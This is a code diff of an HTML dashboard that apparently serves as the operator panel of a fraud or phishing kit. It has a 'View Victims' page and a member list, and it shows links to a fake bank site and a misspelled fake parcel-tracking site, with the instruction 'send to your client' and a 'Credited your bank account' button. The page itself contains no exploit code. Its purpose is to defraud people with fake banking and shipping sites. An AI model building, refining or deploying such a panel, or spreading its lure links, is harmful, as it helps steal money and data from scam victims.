@@ -3,245 +3,195 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>🚀 Dashboard</title>
+  <title>Dashboard</title>
   <style>
     body {
       margin: 0;
       font-family: Arial, sans-serif;
       background: black;
-      color: white;
+      color: lime;
+      height: 100vh;
       overflow: hidden;
     }
 
-    /* Matrix Canvas */
-    canvas#matrix {
+    /* Canvas for green matrix background */
+    #matrix {
       position: fixed;
-      top: 0;
-      left: 0;
-      width: 100%;
-      height: 100%;
+      top: 0; left: 0;
+      width: 100%; height: 100%;
       z-index: -1;
+      background: black;
     }
 
-    .header {
-      display: flex;
-      align-items: center;
-      background: rgba(0, 0, 0, 0.9);
-      padding: 10px;
-      z-index: 10;
-      position: relative;
-    }
-    .menu-btn {
-      font-size: 22px;
-      background: none;
-      border: none;
-      color: white;
-      cursor: pointer;
-      margin-right: 15px;
-    }
-    .logo {
-      height: 40px;
-    }
-    .sidebar {
+    /* Sidebar */
+    #sidebar {
       position: fixed;
-      top: 0;
-      left: -250px;
+      top: 0; left: -250px;
       width: 250px;
       height: 100%;
-      background: rgba(0, 0, 0, 0.95);
-      padding-top: 60px;
-      transition: 0.3s;
+      background: rgba(0,0,0,0.95);
+      overflow-y: auto;
+      transition: left 0.3s ease;
+      padding: 20px;
       z-index: 1000;
     }
-    .sidebar a {
+    #sidebar.active { left: 0; }
+
+    #sidebar a {
       display: block;
       padding: 12px;
-      color: white;
+      color: lime;
       text-decoration: none;
       border-bottom: 1px solid #333;
     }
-    .sidebar a:hover {
-      background: #0f0;
+    #sidebar a:hover { background: #111; }
+
+    /* Menu button */
+    #menuBtn {
+      position: fixed;
+      top: 15px; left: 15px;
+      background: lime;
       color: black;
-    }
-    .sidebar.show {
-      left: 0;
-    }
-    .content {
-      margin-top: 0;
-      width: 100%;
-      height: calc(100vh - 50px);
-      overflow: auto;
-      padding: 20px;
-    }
-    iframe {
-      width: 100%;
-      height: 400px;
+      padding: 10px 15px;
       border: none;
-      background: #111;
-      margin-bottom: 20px;
-    }
-
-    /* Cards */
-    .card {
-      background: rgba(0,0,0,0.8);
-      padding: 20px;
-      border: 1px solid #0f0;
-      border-radius: 8px;
-      margin-bottom: 20px;
-    }
-    .btn {
-      display: inline-block;
-      margin-top: 10px;
-      padding: 8px 12px;
-      background: #0f0;
-      color: black;
-      text-decoration: none;
-      border-radius: 5px;
       cursor: pointer;
-    }
-    .copy-input {
-      width: 100%;
-      padding: 8px;
-      margin-top: 5px;
-      background: #111;
-      color: #0f0;
-      border: 1px solid #0f0;
+      font-weight: bold;
+      border-radius: 5px;
+      z-index: 1100;
     }
 
-    /* Emergency Message */
-    .emergency {
-      background: red;
-      color: white;
-      padding: 15px;
-      border-radius: 8px;
-      margin-bottom: 20px;
-      font-weight: bold;
-      text-align: center;
+    /* Main content */
+    #content {
+      margin-left: 0;
+      width: 100%;
+      height: 100%;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+    }
+
+    #dashboardFrame {
+      width: 100%;
+      height: 100%;
+      border: none;
+      background: white;
     }
   </style>
 </head>
 <body>
 
+  <!-- Matrix background -->
   <canvas id="matrix"></canvas>
 
-  <div class="header">
-    <button class="menu-btn" onclick="toggleMenu()">☰</button>
-    <img src="logo.png" alt="Logo" class="logo" id="dashboardLogo">
-    <h2 style="margin-left:10px;">Dashboard</h2>
-  </div>
+  <!-- Menu button -->
+  <button id="menuBtn">☰ Menu</button>
 
-  <div class="sidebar" id="sidebar">
-    <a href="#" onclick="loadHome()">🏠 Home</a>
-    <a href="#" onclick="loadPage('form-builder.html')">📑 Form Builder</a>
+  <!-- Sidebar Menu -->
+  <div id="sidebar">
+    <a href="#" onclick="loadPage('home.html')">🏠 Home</a>
+    <a href="#" onclick="loadPage('form-builder.html')">📝 Form Builder</a>
     <a href="#" onclick="loadPage('saved-forms.html')">💾 Saved Forms</a>
     <a href="#" onclick="loadPage('feedback.html')">💬 Feedback</a>
-    <a href="#" onclick="loadPage('view-victims.html')">👥 View Victims</a>
-    <a href="#" onclick="loadPage('members.html')">👤 Members</a>
+    <a href="#" onclick="loadPage('victims.html')">👀 View Victims</a>
+    <a href="#" onclick="loadPage('members.html')">👥 Members</a>
     <a href="#" onclick="loadPage('links.html')">🔗 Links</a>
-    <a href="#" onclick="loadPage('generate.html')">⚡ Generate</a>
+    <a href="#" onclick="loadPage('generate.html')">⚙️ Generate</a>
     <a href="#" onclick="loadPage('emergency.html')">🚨 Emergency Message</a>
-    <a href="#" onclick="uploadLogo()">🖼️ Upload Logo</a>
+    <a href="#" onclick="loadIframe('bank')">🏛️ Bank</a>
+    <a href="#" onclick="loadIframe('tracking')">✈️🚢 Tracking</a>
+    <a href="#" onclick="loadPage('upload-logo.html')">🖼️ Upload Logo</a>
   </div>
 
-  <div class="content" id="mainContent">
-    <!-- Emergency Message -->
-    <div class="emergency" id="emergencyBox">
-      🚨 Emergency Message: Stay alert! This is a sample emergency notice.
-    </div>
-
-    <!-- Iframe for loading pages -->
-    <iframe id="mainFrame" src=""></iframe>
-
-    <!-- Default Home Content -->
-    <div class="card">
-      <h2>🏛️ BANK</h2>
-      <p>Copy this link and send to your client:</p>
-      <input class="copy-input" type="text" value="https://bulksms4.github.io/BANKING/" id="bankLink" readonly>
-      <button class="btn" onclick="copyLink('bankLink')">📋 Copy Link</button>
-      <a href="https://bulksms4.github.io/BANKING/" target="_blank" class="btn">Open Account</a>
-      <a href="#" class="btn">💵💰 Credited your bank account 🪙</a>
-    </div>
-
-    <div class="card">
-      <h2>✈️🚢 Track Package 🛍️🛒</h2>
-      <p>Give this link to your client to track the package you send 🛍️🧑‍💻🚚</p>
-      <input class="copy-input" type="text" value="https://x-cargo-exprees.web.app/" id="trackLink" readonly>
-      <button class="btn" onclick="copyLink('trackLink')">📋 Copy Link</button>
-      <a href="https://x-cargo-exprees.web.app/" target="_blank" class="btn">🌍 Open Tracking</a>
-      <a href="#" class="btn">📦 Create Package</a>
-    </div>
+  <!-- Main Dashboard Content -->
+  <div id="content">
+    <iframe id="dashboardFrame"></iframe>
   </div>
 
   <script>
-    function toggleMenu() {
-      document.getElementById("sidebar").classList.toggle("show");
+    const sidebar = document.getElementById("sidebar");
+    const menuBtn = document.getElementById("menuBtn");
+    const frame = document.getElementById("dashboardFrame");
+
+    // Toggle sidebar
+    menuBtn.addEventListener("click", () => {
+      sidebar.classList.toggle("active");
+    });
+
+    // Load external HTML page inside iframe
+    function loadPage(file) {
+      frame.src = file;
+      sidebar.classList.remove("active");
     }
 
-    function loadPage(page) {
-      document.getElementById("mainFrame").src = page;
-      document.getElementById("sidebar").classList.remove("show");
+    // Load special Bank & Tracking iframe content
+    function loadIframe(type) {
+      if (type === "bank") {
+        frame.srcdoc = `
+          <div style="padding:20px; text-align:center; color:lime; background:black; height:100%;">
+            <h2>🏛️ Bank</h2>
+            <p>Copy this link and send to your client:</p>
+            <input value="https://bulksms4.github.io/BANKING/" readonly style="width:80%;padding:5px;text-align:center;">
+            <br><br>
+            <a href="https://bulksms4.github.io/BANKING/" target="_blank"
+              style="display:inline-block;padding:10px 20px;background:lime;color:black;text-decoration:none;">
+              Open Account
+            </a>
+            <br><br>
+            <button style="padding:10px 20px;background:green;color:white;">💵💰 Credited your bank account 🪙</button>
+          </div>`;
+      } else if (type === "tracking") {
+        frame.srcdoc = `
+          <div style="padding:20px; text-align:center; color:lime; background:black; height:100%;">
+            <h2>✈️🚢 Track Package 🛍️🛒</h2>
+            <p>Give this link to your client:</p>
+            <input value="https://x-cargo-exprees.web.app/" readonly style="width:80%;padding:5px;text-align:center;">
+            <br><br>
+            <a href="https://x-cargo-exprees.web.app/" target="_blank"
+              style="display:inline-block;padding:10px 20px;background:lime;color:black;text-decoration:none;">
+              Open Tracking
+            </a>
+            <br><br>
+            <a href="https://x-cargo-exprees.web.app/create" target="_blank"
+              style="display:inline-block;padding:10px 20px;background:green;color:white;">
+              ➕ Create Package
+            </a>
+          </div>`;
+      }
+      sidebar.classList.remove("active");
     }
 
-    function loadHome() {
-      document.getElementById("mainFrame").src = "";
-      document.getElementById("mainContent").scrollTop = 0;
-      document.getElementById("sidebar").classList.remove("show");
-    }
+    // Load home by default
+    loadPage("home.html");
 
-    function copyLink(id) {
-      const input = document.getElementById(id);
-      input.select();
-      input.setSelectionRange(0, 99999);
-      navigator.clipboard.writeText(input.value);
-      alert("Copied: " + input.value);
-    }
-
-    function uploadLogo() {
-      const fileInput = document.createElement("input");
-      fileInput.type = "file";
-      fileInput.accept = "image/*";
-      fileInput.onchange = e => {
-        const file = e.target.files[0];
-        if (file) {
-          const reader = new FileReader();
-          reader.onload = function(ev) {
-            document.getElementById("dashboardLogo").src = ev.target.result;
-          };
-          reader.readAsDataURL(file);
-        }
-      };
-      fileInput.click();
-      document.getElementById("sidebar").classList.remove("show");
-    }
-
-    // Matrix background animation
-    const canvas = document.getElementById('matrix');
-    const ctx = canvas.getContext('2d');
+    // Green matrix background animation
+    const canvas = document.getElementById("matrix");
+    const ctx = canvas.getContext("2d");
     canvas.height = window.innerHeight;
     canvas.width = window.innerWidth;
-    const letters = '01';
-    const fontSize = 14;
+
+    const letters = "01";
+    const fontSize = 16;
     const columns = canvas.width / fontSize;
     const drops = Array(Math.floor(columns)).fill(1);
-    function drawMatrix() {
-      ctx.fillStyle = 'rgba(0,0,0,0.05)';
-      ctx.fillRect(0, 0, canvas.width, canvas.height);
-      ctx.fillStyle = '#0f0';
-      ctx.font = fontSize + 'px monospace';
-      drops.forEach((y, x) => {
-        const text = letters.charAt(Math.floor(Math.random() * letters.length));
-        ctx.fillText(text, x * fontSize, y * fontSize);
-        if (y * fontSize > canvas.height && Math.random() > 0.975) drops[x] = 0;
-        drops[x]++;
-      });
-    }
-    setInterval(drawMatrix, 33);
 
-    window.addEventListener("resize", () => {
-      canvas.height = window.innerHeight;
-      canvas.width = window.innerWidth;
-    });
+    function drawMatrix() {
+      ctx.fillStyle = "rgba(0, 0, 0, 0.05)";
+      ctx.fillRect(0, 0, canvas.width, canvas.height);
+      ctx.fillStyle = "#0F0"; // green
+      ctx.font = fontSize + "px monospace";
+
+      for (let i = 0; i < drops.length; i++) {
+        const text = letters[Math.floor(Math.random() * letters.length)];
+        ctx.fillText(text, i * fontSize, drops[i] * fontSize);
+
+        if (drops[i] * fontSize > canvas.height && Math.random() > 0.975) {
+          drops[i] = 0;
+        }
+        drops[i]++;
+      }
+    }
+    setInterval(drawMatrix, 50);
   </script>
+
 </body>
 </html>
